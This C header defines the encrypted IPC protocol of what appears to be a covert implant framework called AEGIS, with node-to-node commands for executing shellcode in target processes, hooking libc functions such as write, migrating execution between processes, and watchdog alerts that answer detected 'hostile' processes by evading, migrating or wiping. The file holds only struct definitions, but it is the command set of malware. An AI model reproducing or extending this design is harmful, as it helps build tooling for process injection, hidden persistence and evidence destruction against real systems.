/*
 * ============================================================================
 *  AEGIS FRAMEWORK — IPC Protocol Definitions
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nexus_auditor/ipc_protocol.h
 *  Purpose        : Wire format and constants for Alpha<->Beta node
 *                   communication over encrypted Unix domain sockets.
 * ============================================================================
 */

#ifndef AEGIS_IPC_PROTOCOL_H
#define AEGIS_IPC_PROTOCOL_H

#include "../common/config.h"
#include "../common/types.h"


/* ── IPC Message Wire Format ─────────────────────────────────────────────── */

/*
 * All IPC messages use the following envelope:
 *
 * ┌─────────────┬──────────┬──────────┬──────────┬───────────┬──────────┐
 * │  Magic (4B) │ Cmd (2B) │ Len (4B) │ IV (12B) │ Tag (16B) │ Payload  │
 * └─────────────┴──────────┴──────────┴──────────┴───────────┴──────────┘
 *
 * The payload is AES-256-GCM encrypted.  The envelope header (magic+cmd+len)
 * is used as Additional Authenticated Data (AAD) for tamper detection.
 */

#define IPC_MAGIC 0xAE610001

typedef struct {
  uint32_t magic;                   /* IPC_MAGIC                */
  uint16_t command;                 /* aegis_ipc_cmd_t          */
  uint32_t payload_len;             /* Length of encrypted body */
  uint8_t iv[AEGIS_GCM_IV_BYTES];   /* Per-message IV           */
  uint8_t tag[AEGIS_GCM_TAG_BYTES]; /* Authentication tag       */
} AEGIS_PACKED aegis_ipc_header_t;

/* ── Command Payloads ────────────────────────────────────────────────────── */

/* CMD_HEARTBEAT payload */
typedef struct {
  pid_t pid;
  uint32_t tid;
  uint64_t uptime_ns;    /* Node uptime              */
  uint32_t ops_executed; /* Nanomachine ops so far   */
  uint8_t status;        /* 0=idle, 1=active, 2=err  */
} AEGIS_PACKED ipc_heartbeat_t;

/* CMD_EXEC_SHELLCODE payload */
typedef struct {
  pid_t target_pid; /* 0 = broadcast to all     */
  uint32_t shellcode_len;
  uint8_t shellcode[]; /* Variable-length shellcode*/
} AEGIS_PACKED ipc_exec_shellcode_t;

/* CMD_HOOK_FUNCTION payload */
typedef struct {
  pid_t target_pid;      /* 0 = broadcast            */
  char target_lib[256];  /* e.g., "libc.so.6"       */
  char target_func[128]; /* e.g., "write"           */
  char redirect_to[128]; /* Internal hook name      */
} AEGIS_PACKED ipc_hook_function_t;

/* CMD_UNHOOK_FUNCTION payload */
typedef struct {
  pid_t target_pid;
  char target_lib[256];
  char target_func[128];
} AEGIS_PACKED ipc_unhook_function_t;

/* CMD_DISTRIBUTE_CHUNK payload */
typedef struct {
  uint32_t chunk_id;
  uint32_t total_chunks;
  uint32_t chunk_len;
  uint8_t chunk_iv[AEGIS_GCM_IV_BYTES];
  uint8_t chunk_tag[AEGIS_GCM_TAG_BYTES];
  uint8_t data[]; /* Encrypted chunk data     */
} AEGIS_PACKED ipc_distribute_chunk_t;

/* CMD_COLLECT_CHUNK payload (request) */
typedef struct {
  uint32_t chunk_id;
} AEGIS_PACKED ipc_collect_chunk_req_t;

/* CMD_COLLECT_CHUNK payload (response) */
typedef struct {
  uint32_t chunk_id;
  uint32_t chunk_len;
  uint8_t data[]; /* Encrypted chunk data     */
} AEGIS_PACKED ipc_collect_chunk_resp_t;

/* CMD_MIGRATE payload */
typedef struct {
  pid_t from_pid;
  pid_t to_pid;
  uint32_t context_len;
  uint8_t context[]; /* Serialized execution ctx */
} AEGIS_PACKED ipc_migrate_t;

/* CMD_REKEY payload */
typedef struct {
  uint8_t new_salt[AEGIS_HKDF_SALT_BYTES];
  uint64_t effective_sequence; /* Apply after this seqno  */
} AEGIS_PACKED ipc_rekey_t;

/* CMD_STATUS_QUERY response */
typedef struct {
  pid_t pid;
  uint8_t node_type; /* aegis_node_type_t        */
  uint32_t hooks_active;
  uint32_t chunks_held;
  uint64_t memory_used;
  uint8_t status;
} AEGIS_PACKED ipc_status_resp_t;

/* CMD_WATCHDOG_ALERT payload */
typedef struct {
  pid_t hostile_pid;
  char hostile_comm[256];
  uint8_t threat_level;       /* 1-5                      */
  uint8_t recommended_action; /* 0=ignore, 1=evade,
                                 2=migrate, 3=wipe       */
} AEGIS_PACKED ipc_watchdog_alert_t;

/* ── Beta Node Registry (Alpha-side) ────────────────────────────────────── */

typedef struct {
  aegis_node_id_t id;
  int sock_fd; /* Connected socket         */
  uint64_t last_heartbeat_ns;
  uint32_t chunks_held;
  uint32_t hooks_active;
  bool alive;
} aegis_beta_entry_t;

#endif /* AEGIS_IPC_PROTOCOL_H */
